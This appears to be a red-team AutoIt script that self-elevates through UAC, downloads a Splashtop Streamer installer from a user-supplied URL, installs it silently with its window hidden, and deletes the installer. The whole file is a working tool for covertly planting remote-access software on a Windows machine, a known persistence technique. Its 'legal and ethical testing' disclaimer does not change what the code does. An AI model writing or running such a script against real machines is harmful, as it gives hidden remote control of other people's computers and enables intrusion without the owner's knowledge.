; AutoIt script to download & silently install Splashtop Streamer with UAC elevation.
; Saves installer to script folder, runs “prevercheck /s /i hidewindow=1”, then cleans up.
; Paste your URL for Splashtop where it says (Paste Install URL here).  
; Note: This is not the URL they give you; it is the secondary URL you hunt for via F12, network, and filter on zip.
; See the Readme.md files for how to use, including detailed setup steps. 
; This script is for testing purple/red team purposes only - use only for legal and ethical testing scenarios.

; ------------------------ Configuration ------------------------
Global Const $DOWNLOAD_URL = _
    "(Paste Install URL here)"
; ---------------------------------------------------------------

; 1) Require admin—or self-elevate
If Not IsAdmin() Then
    Local $sParams = '"' & @ScriptFullPath & '"'
    Local $hExec   = ShellExecute(@AutoItExe, $sParams, "", "runas")
    If $hExec <= 32 Then
        MsgBox(16, "Error", "Elevation failed or was cancelled.")
        Exit
    EndIf
    Exit  ; Original process ends; elevated copy will continue below
EndIf

; 2) Compute local paths
Local $iPos      = StringInStr($DOWNLOAD_URL, "/", 0, -1)
Local $sFileName = StringRight($DOWNLOAD_URL, StringLen($DOWNLOAD_URL) - $iPos)
Local $sDestPath = @ScriptDir & "\" & $sFileName

; 3) Download installer
ConsoleWrite("Downloading " & $sFileName & " …" & @CRLF)
Local $hDL = InetGet($DOWNLOAD_URL, $sDestPath, 1)
If @error Then
    MsgBox(16, "Download Error", "Could not start download.")
    Exit
EndIf

; Wait for download to finish
While InetGetInfo($hDL, 1) = 1
    Sleep(200)
WEnd
If InetGetInfo($hDL, 0) <> 0 Then
    MsgBox(16, "Download Error", "Download failed with code: " & InetGetInfo($hDL, 0))
    Exit
EndIf
ConsoleWrite("Download complete." & @CRLF)

; 4) Run silent install
ConsoleWrite("Installing Splashtop Streamer silently …" & @CRLF)
Local $sParams = 'prevercheck /s /i hidewindow=1'
Local $iExit   = ShellExecuteWait($sDestPath, $sParams, @ScriptDir, "", @SW_HIDE)
If $iExit <> 0 Then
    MsgBox(16, "Install Error", "Installer exited with code " & $iExit)
    ; Clean up even on failure
    FileDelete($sDestPath)
    Exit
EndIf
ConsoleWrite("Installation finished successfully." & @CRLF)

; 5) Cleanup
FileDelete($sDestPath)
ConsoleWrite("Cleaned up installer file." & @CRLF)

MsgBox(64, "Done", "Splashtop Streamer is installed.")
